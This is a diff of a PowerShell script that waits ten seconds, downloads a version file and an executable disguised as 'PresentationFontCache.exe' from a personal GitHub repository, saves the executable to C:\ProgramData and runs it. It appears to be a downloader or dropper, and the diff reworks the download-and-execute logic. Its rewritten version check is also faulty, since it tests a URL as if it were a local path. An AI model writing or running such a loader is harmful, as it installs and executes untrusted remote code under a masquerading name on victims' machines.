@@ -1,49 +1,33 @@
 Start-Sleep -s 10
+# Set the TLS protocol version
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Set the URL
 $url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
-$file_text = "C:\ProgramData\version.txt"
+$url_exe = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
+$file_exe = "C:\ProgramData\PresentationFontCache.exe"
 
-# Download version.txt
-$down = New-Object System.Net.WebClient
-$down.DownloadFile($url_text,$file_text)
+# Check if the version file exists
+if (Test-Path $url_text) {
+    # Download the version file
+    Invoke-WebRequest $url_text -OutFile "C:\ProgramData\version.txt"
 
-# Read the downloaded version.txt
-$version = Get-Content $file_text
-
-# Compare downloaded version.txt with $url_text
-if ($version -eq (Invoke-WebRequest -Uri $url_text -UseBasicParsing).Content) {
-
-    $file = "C:\ProgramData\PresentationFontCache.exe"
-
-    # Check if PresentationFontCache.exe exists
-    if (Test-Path $file) {
+    # Check if the exe file exists
+    if (Test-Path $file_exe) {
         # Run the exe file
-        $exec = New-Object -com shell.application
-        $exec.shellexecute($file)
+        Start-Process -FilePath $file_exe
     } else {
-        # Download exe file
-        $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
-        $file = "C:\ProgramData\PresentationFontCache.exe"
-        $down = New-Object System.Net.WebClient
-        $down.DownloadFile($url,$file)
+        # Download the exe file
+        Invoke-WebRequest $url_exe -OutFile $file_exe
         # Run the exe file
-        $exec = New-Object -com shell.application
-        $exec.shellexecute($file)
-        }
+        Start-Process -FilePath $file_exe
+    }
 } else {
-    # Version change, download the new exe file
-    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
-    $file = "C:\ProgramData\PresentationFontCache.exe"
-    $down = New-Object System.Net.WebClient
-    $down.DownloadFile($url,$file)
+    # Updated the exe file
+    Invoke-WebRequest $url_exe -OutFile $file_exe
     # Run the exe file
-    $exec = New-Object -com shell.application
-    $exec.shellexecute($file)
-    $url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
-    $file_text = "C:\ProgramData\version.txt"
-    # Download version.txt
-    $down = New-Object System.Net.WebClient
-    $down.DownloadFile($url_text,$file_text)
+    Start-Process -FilePath $file_exe
 }
+
 # Exit the script
 exit
